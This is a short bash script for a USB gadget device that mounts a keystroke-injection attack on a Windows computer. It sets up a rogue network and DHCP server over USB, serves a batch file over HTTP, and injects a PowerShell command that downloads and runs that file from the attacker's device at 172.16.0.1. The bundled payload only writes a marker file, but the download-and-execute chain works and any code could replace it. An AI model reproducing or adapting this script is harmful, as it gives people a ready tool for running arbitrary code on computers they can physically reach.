#!/bin/bash
sudo ifconfig usb0 172.16.0.1 netmask 255.255.255.0 up
sudo systemctl stop dnsmasq || true
echo -e "interface=usb0\ndhcp-range=172.16.0.10,172.16.0.20,255.255.255.0,24h" | sudo tee /etc/dnsmasq.d/usb0.conf
sudo systemctl restart dnsmasq

sudo mkdir -p /srv/http
echo -e "@echo off\necho owned > C:\\owned.txt" | sudo tee /srv/http/drop.bat > /dev/null
sudo python3 -m http.server --directory /srv/http 80 &
sleep 2

python3 send_keys.py 'powershell -c "iwr http://172.16.0.1/drop.bat -OutFile C:\\drop.bat; C:\\drop.bat"\n'
sleep 10
sudo pkill -f "http.server"